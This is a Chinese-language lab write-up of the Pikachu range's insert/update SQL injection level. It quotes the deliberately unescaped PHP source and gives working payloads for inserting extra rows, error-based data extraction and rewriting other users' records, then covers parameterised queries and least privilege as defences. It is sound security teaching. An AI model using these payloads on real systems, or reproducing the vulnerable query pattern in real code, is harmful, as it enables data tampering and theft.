# "insert/update" 注入 通关笔记
> 前面的注入都是 `select`——只读。
>
> 这一关是**写**：注册（insert）和改资料（update）。
>
> **写操作的注入更危险，因为它能改数据、能插数据。**
---
## 一、环境与目标
| 项目 | 内容 |
| --- | --- |
| 靶场 | Pikachu |
| 关卡位置 | SQL-Inject → "insert/update"注入 |
| 注册页 | `http://pikachu/vul/sqli/sqli_iu/sqli_reg.php` |
| 登录页 | `http://pikachu/vul/sqli/sqli_iu/sqli_login.php` |
| 会员中心 | `http://pikachu/vul/sqli/sqli_iu/sqli_mem.php` |
| 修改页 | `http://pikachu/vul/sqli/sqli_iu/sqli_edit.php` |
| 测试账号 | `vince` / `123456` |
| 目标 | 在注册或修改资料时注入 |
---
## 二、我的解题步骤
### 步骤 1：先看注册的字段
注册页有六个输入框：
```
用户:  [必填]
密码:  [必填]
性别:  []
手机:  []
地址:  []     ← 注意，name="email"
住址:  []     ← 注意，name="add"
```
> 这两个标签是错的：显示"地址"的框其实是 `email`，显示"住址"的其实是 `add`。这是源码里的小 bug，不影响注入。
### 步骤 2：先正常注册一个
随便填，点 submit：
```
注册成功,请返回登录
```
说明 SQL 执行成功了。
### 步骤 3：试探注入——在用户名里加一个单引号
```
用户名: test'
```
提交。
**页面直接输出 SQL 报错：**
```
You have an error in your SQL syntax; check the manual that corresponds to your
MySQL server version for the right syntax to use near ...
```
**确认注入存在。**
### 步骤 4：试 update 注入
先登录 `vince` / `123456`，进入会员中心，点「修改个人信息」。
在「性别」里输入一个 `'`，提交。
**同样报 SQL 语法错误。**
---
## 三、原理分析
### 3.1 注册（insert）的源码
```php
if(isset($_POST['submit'])){
    if($_POST['username']!=null &&$_POST['password']!=null){
//      $getdata=escape($link, $_POST);//转义
        //没转义,导致注入漏洞,操作类型为insert
        $getdata=$_POST;
        $query="insert into member(username,pw,sex,phonenum,email,address) values('{$getdata['username']}',md5('{$getdata['password']}'),'{$getdata['sex']}','{$getdata['phonenum']}','{$getdata['email']}','{$getdata['add']}')";
        $result=execute($link, $query);
```
**注意注释里那行被注释掉的转义代码**——作者故意关掉了它。
### 3.2 修改（update）的源码
```php
if(isset($_POST['submit'])){
    if($_POST['sex']!=null && $_POST['phonenum']!=null && $_POST['add']!=null && $_POST['email']!=null){
//        $getdata=escape($link, $_POST);
        //未转义,形成注入,sql操作类型为update
        $getdata=$_POST;
        $query="update member set sex='{$getdata['sex']}',phonenum='{$getdata['phonenum']}',address='{$getdata['add']}',email='{$getdata['email']}' where username='{$_SESSION['sqli']['username']}'";
```
同样是**故意不转义**。
### 3.3 为什么写操作更危险
| | select 注入 | insert / update 注入 |
| --- | --- | --- |
| 能做什么 | 读数据 | **改数据、插数据** |
| 危害 | 泄露 | **篡改** |
| 典型后果 | 脱库 | 改余额、改权限、插后门账号 |
**读只是"看"，写是"改"——后者能直接造成业务损失。**
### 3.4 insert 注入能干什么
**① 插入额外的数据**
用户名填：
```
test'),('hacker','x','x','x','x','x')#
```
代入：
```sql
insert into member(username,pw,sex,phonenum,email,address)
values('test'),('hacker','x','x','x','x','x')#',md5('...'),...)
```
**一次注册，插了两条记录。**
**② 报错注入**
用 `extractvalue()` 或 `updatexml()` 把数据"挤"到报错信息里：
```
test' and extractvalue(1,concat(0x7e,(select database())))#
```
报错信息里会带出数据库名。
**③ 读别的表**
配合报错注入或子查询，把 `users` 表的密码读出来。
### 3.5 update 注入能干什么
```sql
update member set sex='[注入点]', ... where username='vince'
```
**① 改别人的数据**
sex 填：
```
',sex=(select password from users limit 1)#
```
或者：
```
' where username='admin'#
```
**借助 `where` 注入，可以改掉任意用户的数据。**
**② 提权**
如果 `member` 表里有 `is_admin` 这类字段，可以直接改成 1。
---
## 四、知识点与笔记
### 4.1 写操作注入的判断
| 输入 | 正常 | 异常 |
| --- | --- | --- |
| `'` | 正常保存 | **SQL 报错** |
| `test'` | 正常 | **SQL 报错** |
| `''` | 正常 | 可能报错 |
**和查询型一样：一个单引号就能探出来。**
### 4.2 为什么写操作更容易被忽略
开发者的心理：
> "注册页面都是新用户，能有什么危害？"
但事实上：
- 注册能插任意数据
- 改资料能改任意用户
- **这些操作往往不需要经过管理员审核**
### 4.3 insert 注入的常见闭合
SQL：
```sql
insert into t(a,b,c) values('$a','$b','$c')
```
第一个字段 `$a` 的 payload：
```
x'),('新数据1','新数据2','新数据3')#
```
思路：闭合 `')`、加新的 `values`、注释掉后面。
### 4.4 update 注入的常见闭合
SQL：
```sql
update t set a='$a', b='$b' where id=$id
```
`$a` 的 payload：
```
x', b=(select ...)#
```
或者干脆用 `where` 扩大影响范围：
```
x' where 1=1#
```
### 4.5 报错注入的两个常用函数
```sql
and extractvalue(1, concat(0x7e, (select database())))
and updatexml(1, concat(0x7e, (select database())), 1)
```
原理：`concat` 拼出来的字符串不符合 XPath 格式 → 报错 → **报错信息里包含你要的数据**。
---
## 五、和其他几关的区别
| 关卡 | SQL 操作 | 危害类型 |
| --- | --- | --- |
| 数字型 / 字符型 / 搜索型 / xx型 | **select** | 读（脱库） |
| **insert** | **insert** | **写（插数据）** |
| **update** | **update** | **写（改数据）** |
| delete | delete | 删（删数据） |
**从这一关开始，攻击面从"看"变成了"改"。**
---
## 六、防御怎么写
### 6.1 参数化
```php
$stmt = $link->prepare("insert into member(username,pw,sex,phonenum,email,address) values(?,?,?,?,?,?)");
$stmt->bind_param('ssssss', $username, md5($password), $sex, $phonenum, $email, $add);
$stmt->execute();
```
### 6.2 注意字段名的坑
源码里有个奇怪的地方：
```html
<p class="reg_email">地址:<input class="r_email" type="text" name="email" /></p>
<p class="reg_add">住址:<input class="r_add" type="text" name="add" /></p>
```
**标签写反了**（"地址"对应 email，"住址"对应 add）。
这不是安全问题，但说明代码质量不高——**质量不高的代码往往同时有安全问题**。
### 6.3 最小权限
```sql
GRANT SELECT, INSERT, UPDATE ON app_db.* TO 'app_user'@'localhost';
-- 不要给 DROP、FILE、SUPER
```
**即使被注入，权限小也能把损失控制住。**
### 6.4 输入校验（辅助）
```php
if (!preg_match('/^[a-zA-Z0-9_]{3,20}$/', $username)) {
    exit('用户名只能是字母数字下划线');
}
```
**白名单校验能挡掉大部分注入 payload**，但它不能替代参数化。
---
## 七、总结
| 要点 | 内容 |
| --- | --- |
| 这关教什么 | 写操作也能注入 |
| 两个入口 | 注册（insert）、改资料（update） |
| 探测 | 输入 `'` 看报错 |
| 危害 | 插数据、改任意用户、提权 |
| 修复 | 参数化 + 最小权限 |
**一句话**：
> **查询型注入是"偷看"，写操作注入是"动手改"——后者更该紧张。**
---
## 参考
- [OWASP: SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [MySQL: INSERT](https://dev.mysql.com/doc/refman/8.0/en/insert.html)
- [Pikachu 源码](https://github.com/zhuifengshaonianhanlu/pikachu)
